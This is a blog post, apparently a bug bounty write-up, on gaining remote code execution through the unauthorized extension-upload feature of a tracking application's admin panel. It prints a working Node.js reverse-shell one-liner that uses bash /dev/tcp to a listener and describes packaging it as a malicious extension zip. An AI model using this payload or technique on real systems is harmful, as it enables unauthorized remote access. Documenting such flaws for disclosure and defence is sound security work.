---
layout: post
title:  "RCE on Application’s Tracking Admin Panel"
date:   2023-09-03 21:39:54 +0530
categories: Bugbounty
---

In this blog post, we’ll explore some intriguing scenarios where the add extension functionality in a particular subdomain can be exploited to enable a Remote Code Execution vulnerability. The application in question is a tracking system that can monitor study hours, walking distance, and, if using the Android version, application usage levels. By delving into the specifics of this potential vulnerability and its potential impact, we hope to provide valuable insights for both developers and security professionals.

![]({{ site.baseurl }}/assets/images/rce-1.png)

## Vulnerability in Tracking Application’s Admin Panel

A concerning vulnerability has been identified in the admin panel of the Tracking application. Specifically, when creating an extension, the application fails to implement proper authorization checks for all users. This means that regular users can upload extensions without restriction via the admin panel, potentially leading to remote code execution. Addressing this vulnerability by implementing proper authorization checks is critical to preventing unauthorized access and maintaining the security of the application. It highlights the importance of implementing robust access controls and security measures to protect against potential exploits and vulnerabilities.
Carrying Out the File Upload Attack

In order to successfully submit an extension upload, we must first create two required file types: a JavaScript file containing the extension’s code and a JSON file containing metadata like the extension’s name, version and description. By compiling these two files along with any other necessary files into a ZIP archive and uploading that, our extension is more likely to pass the initial review process due to being properly organized and containing all required files

Now, let’s write some javascript code that will send the reverse shell to our listening server

```js
require(‘child_process’).exec(‘bash -c “bash -i >& /dev/tcp/192.168.0.143/9999 0>&1"’) 
```

In the provided code snippet, we utilize the Node.js child process module. Node.js typically operates as a single-threaded, non-blocking system, which can struggle with increasing workloads. However, the child_process module solves this issue by allowing for the spawning of child processes. These child processes can communicate with each other using a built-in messaging system.

We make use of the exec() child process to execute system commands, specifically to establish a reverse TCP connection to our listener server. This allows remote access to the system and the potential exploitation of vulnerabilities. It is critical to note that such actions should only be performed with permission and in a controlled testing environment to avoid any negative impact on the system or its users.

To create an extension for the Tracking application, a metadata file is required. This file contains essential information about the extension, such as its UUID, name, and description. Here is a basic example that we can use:

```json
{
"name": "Test"
}
```

This metadata file is necessary for the proper functioning of the extension and must be included when uploading the extension to the application. Ensuring that all required files and information are included when creating and uploading extensions is critical to maintaining the security and integrity of the application.

It is important to note that the admin console of the Tracking application can be accessed by authenticated users through the subdirectory `/admin`. However, as there is no proper authentication mechanism in place for the admin panel, low-privileged users may also be able to access it. This highlights the significance of implementing appropriate security measures and access controls to prevent unauthorized access and maintain the security of the application.

![]({{ site.baseurl }}/assets/images/rce-2.png)

The Tracking application’s admin panel includes an option to upload extensions via the extension tab in the frontend. It is important to note that the upload functionality only accepts zip files and does not support any other file extensions. This restriction is intended to prevent potential security vulnerabilities that could arise from the upload of unsupported file types.

![]({{ site.baseurl }}/assets/images/rce-3.png)

Let’s get down to business! We’re going to start a listening server on our local machine, upload a malicious zip file to the target application through the upload extension functionality, and voila! We’ve got ourselves a reverse shell on our netcat listener.

![]({{ site.baseurl }}/assets/images/rce-4.png)

As a result, you can see we got a reverse shell from daemon server of the application